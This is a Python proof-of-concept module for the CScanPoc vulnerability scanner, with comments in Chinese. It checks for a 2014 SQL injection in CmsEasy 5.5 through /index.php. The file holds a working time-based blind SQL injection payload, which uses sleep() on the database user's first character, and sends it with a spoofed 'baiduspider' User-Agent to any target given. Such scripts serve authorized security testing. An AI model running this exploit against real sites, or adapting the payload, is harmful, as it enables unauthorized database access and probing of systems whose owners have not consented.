# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import datetime


class Vuln(ABVuln):
    vuln_id = 'CmsEasy_0000'  # 平台漏洞编号，留空
    name = 'CmsEasy 5.5 <=20140718 /index.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-20'  # 漏洞公布时间
    desc = '''
        CmsEasy 5.5 <=20140718 /lib/table/stats.php中$_SERVER并没有转义，造成了注入.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=069343'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CmsEasy'  # 漏洞应用名称
    product_version = '5.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c42a4918-3abf-40e4-8af1-dbc1c49b2db1'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/index.php/aaa',(select/**/if((select/**/ord(substr(user(),1,1)))=114,sleep(6),0)),1)#"
            verify_url = '{target}'.format(target=self.target)+payload
            user_agent = {'User-Agent': 'i am baiduspider'}
            req = urllib.request.Request(verify_url, headers=user_agent)
            first_time = datetime.datetime.now()
            content = urllib.request.urlopen(req).read()
            last_time = datetime.datetime.now()
            different_time = (last_time-first_time).seconds
            if different_time >= 6:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
